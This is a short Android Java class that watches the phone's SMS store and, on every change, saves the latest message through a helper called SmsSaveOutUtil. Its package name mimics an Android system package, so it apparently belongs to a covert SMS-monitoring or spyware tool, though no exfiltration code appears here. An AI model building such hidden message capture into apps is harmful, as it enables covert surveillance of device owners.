package com.android.system.controled.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;

import com.android.system.controled.Debug;
import com.android.system.controled.util.SmsSaveOutUtil;

public class SmsContentObserver extends ContentObserver {

//	private Context context;

	public SmsContentObserver(Handler handler) {
		super(handler);
//		this.context = con;
	}

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);

		Debug.e("SmsContentObserver", "ON CHANGED !!!!!");
//		SmsSaveOutUtil so = new SmsSaveOutUtil(context);
		SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
		so.saveLastSms();
	}

}
